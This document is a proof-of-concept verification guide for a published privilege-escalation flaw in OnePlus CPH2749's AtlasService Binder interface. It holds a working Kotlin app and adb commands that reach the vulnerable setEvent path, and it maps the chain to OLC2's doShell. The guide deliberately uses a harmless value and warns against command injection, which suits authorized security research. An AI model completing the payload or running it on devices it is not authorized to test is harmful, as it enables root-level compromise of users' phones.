OnePlus CPH2749 AtlasService PoC Verification
Target

Device: OnePlus CPH2749
Firmware: CPH2749_16.0.0.205(EX01)

This document describes a non-destructive vulnerability verification PoC for the AtlasService Binder interface discussed in the published OnePlus security research.

The PoC is intentionally limited to:

Discovering the relevant Binder services.

Obtaining the Atlas Binder interface.

Constructing the String8 Binder representation.

Invoking AtlasService transaction 2.

Confirming whether the vulnerable code path is reachable.

Collecting diagnostic output.

It does not execute an arbitrary shell command, attempt unrestricted root, modify SELinux policy, establish persistence, or otherwise weaponize the vulnerability.

1. Prerequisites

Install:

Android Studio

Android SDK / platform-tools

JDK

ADB-enabled OnePlus CPH2749

Verify ADB:

adb devices


The device should appear as device.

2. Collect Firmware Information

Run:

adb shell getprop ro.build.version.ota
adb shell getprop ro.build.version.incremental
adb shell getprop ro.build.fingerprint


Save the output.

For the target build, the expected firmware identifier is:

CPH2749_16.0.0.205(EX01)

3. Discover AtlasService

Run:

adb shell service list | grep -i atlas


Also run:

adb shell dumpsys -l | grep -i atlas


Record the exact service name returned by the device.

Do not assume that the service name or Binder descriptor is identical across firmware versions.

4. Discover the OLC2 Interface

Run:

adb shell service list | grep -Ei 'olc|logcore'


Then:

adb shell lshal | grep -Ei 'olc|logcore'


The published research identifies the relevant interface as:

vendor.oplus.hardware.olc2.IOplusLogCore/default


and identifies Binder transaction 6 with the doShell(String cmd) operation.

The verification PoC does not invoke that operation with an arbitrary command.

5. Create the Android Project

Create an empty Android Studio application:

Name: OnePlusAtlasPoC
Package: com.example.atlaspoc
Language: Kotlin
Minimum SDK: 29


No special Android permissions are required.

Recommended structure:

OnePlusAtlasPoC/
├── app/
│   └── src/
│       └── main/
│           ├── java/
│           │   └── com/
│           │       └── example/
│           │           └── atlaspoc/
│           │               ├── MainActivity.kt
│           │               └── AtlasProbe.kt
│           └── AndroidManifest.xml
├── build.gradle
└── settings.gradle

6. MainActivity.kt

Create:

app/src/main/java/com/example/atlaspoc/MainActivity.kt


Use:

package com.example.atlaspoc

import android.app.Activity
import android.os.Bundle
import android.util.Log

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.i("AtlasPoC", "Starting AtlasService verification")

        AtlasProbe.run()
    }
}

7. AtlasProbe.kt

Create:

app/src/main/java/com/example/atlaspoc/AtlasProbe.kt


Use:

package com.example.atlaspoc

import android.os.IBinder
import android.os.Parcel
import android.os.ServiceManager
import android.util.Log

object AtlasProbe {

    private const val TAG = "AtlasPoC"

    /*
     * AtlasService uses Parcel::readString8().
     *
     * This is deliberately kept as a separate helper because
     * Parcel.writeString() uses the normal Android String
     * representation and is not equivalent to String8.
     */
    private fun writeString8(parcel: Parcel, value: String) {
        val bytes = value.toByteArray(Charsets.UTF_8)

        parcel.writeInt(bytes.size + 1)
        parcel.writeByteArray(bytes)
        parcel.writeByte(0)
    }

    fun run() {
        try {
            /*
             * Replace "atlas" with the actual service name discovered
             * using:
             *
             * adb shell service list | grep -i atlas
             */
            val binder: IBinder? =
                ServiceManager.getService("atlas")

            if (binder == null) {
                Log.e(TAG, "Atlas service was not found")
                return
            }

            Log.i(TAG, "Atlas Binder acquired: $binder")

            val data = Parcel.obtain()
            val reply = Parcel.obtain()

            try {
                /*
                 * Replace this descriptor if the target firmware exposes
                 * a different Binder interface descriptor.
                 */
                data.writeInterfaceToken(
                    "com.oplus.atlas.IAtlasService"
                )

                /*
                 * Research-documented event name.
                 */
                writeString8(
                    data,
                    "atlas_event_multimedia_audio_dumpsys"
                )

                /*
                 * Harmless verification value.
                 *
                 * Do NOT replace this with a shell command.
                 */
                writeString8(
                    data,
                    "AtlasPoC_TEST"
                )

                Log.i(
                    TAG,
                    "Invoking AtlasService transaction 2"
                )

                val result = binder.transact(
                    2,
                    data,
                    reply,
                    0
                )

                Log.i(
                    TAG,
                    "transact() returned: $result"
                )

                Log.i(
                    TAG,
                    "Reply size: ${reply.dataSize()}"
                )

            } finally {
                data.recycle()
                reply.recycle()
            }

        } catch (t: Throwable) {
            Log.e(
                TAG,
                "AtlasService probe failed",
                t
            )
        }
    }
}

8. Important Binder Details

The research describes AtlasService transaction 2 as the setEvent path.

Conceptually:

transaction 2
       │
       ├── String8 event name
       │
       └── String8 event value


The event name used by the research is:

atlas_event_multimedia_audio_dumpsys


The PoC deliberately uses:

AtlasPoC_TEST


as the value.

Do not replace the test value with:

sh -c ...


or another arbitrary command.

9. Build

From the project directory:

./gradlew assembleDebug


The APK should be generated under:

app/build/outputs/apk/debug/

10. Install

Install the debug APK:

adb install -r app/build/outputs/apk/debug/app-debug.apk

11. Monitor Logcat

Clear the log:

adb logcat -c


Then monitor the PoC:

adb logcat -s AtlasPoC


Launch the application.

Expected diagnostic output should resemble:

AtlasPoC: Starting AtlasService verification
AtlasPoC: Atlas Binder acquired: ...
AtlasPoC: Invoking AtlasService transaction 2
AtlasPoC: transact() returned: true


The exact output depends on the firmware.

12. If Atlas Is Not Found

If you see:

Atlas service was not found


do not modify the code blindly.

Run:

adb shell service list | grep -i atlas


and record the result.

The service registration name is independent of the Java interface name, so the correct value must be determined from the target firmware.

13. If transact() Fails

Collect:

adb logcat -d -v threadtime | grep -Ei \
'atlas|exception|securityexception|avc|binder'


Also collect:

adb shell dumpsys activity services | grep -i atlas


and:

adb shell ps -AZ | grep -Ei 'atlas|dumpstate'


These results can identify whether the failure is caused by:

an incorrect service name;

an incorrect Binder descriptor;

an incorrect transaction layout;

SELinux restrictions;

a patched implementation;

or a firmware-specific implementation difference.

14. OLC2 Verification

After AtlasService has been independently verified, inspect whether the OLC2 interface exists:

adb shell lshal | grep -Ei 'olc|logcore'


Look for:

vendor.oplus.hardware.olc2.IOplusLogCore/default


The published research associates transaction 6 with:

doShell(String cmd)


The verification procedure should initially stop at confirming that the interface is present and reachable.

Do not send an arbitrary shell command through transaction 6.

15. Evidence Collection

For reproducible security research, collect:

adb shell getprop ro.build.version.ota
adb shell getprop ro.build.version.incremental
adb shell getprop ro.build.fingerprint


and:

adb shell service list


and:

adb shell lshal


along with:

adb logcat -d -v threadtime


Keep the complete outputs associated with the firmware version.

16. Research Flow

The published vulnerability chain can be represented conceptually as:

Untrusted application
        │
        ▼
    AtlasService
        │
        │ transaction 2
        ▼
      setEvent()
        │
        ▼
audioDumpInfo()
        │
        ▼
    dumpstate context
        │
        ▼
       OLC2
        │
        │ transaction 6
        ▼
      doShell()
        │
        ▼
vendor_qti_init_shell


The important distinction is that this document verifies the individual attack surfaces without turning the APK into a general-purpose privilege-escalation payload.

17. Troubleshooting Checklist

If the PoC does not work, check these in order:

Confirm the exact firmware:

adb shell getprop ro.build.version.ota


Confirm Atlas registration:

adb shell service list | grep -i atlas


Confirm OLC2 registration:

adb shell lshal | grep -Ei 'olc|logcore'


Capture Binder/SELinux errors:

adb logcat -d | grep -Ei 'atlas|binder|avc|denied'


Confirm the APK is running as an ordinary application:

adb shell ps -A -o USER,PID,NAME | grep atlaspoc


Do not change multiple variables simultaneously. First establish the service name, then the descriptor, then the transaction format.

18. Safety

This PoC is intended for an owned/authorized test device.

Do not use it to:

bypass device security on someone else's device;

install persistence;

modify SELinux policy;

disable Android security controls;

access another user's data;

execute arbitrary commands as a privileged system process.

The objective of this stage is to establish whether the documented Binder attack surface is present on:

CPH2749
16.0.0.205(EX01)


before proceeding with deeper security analysis.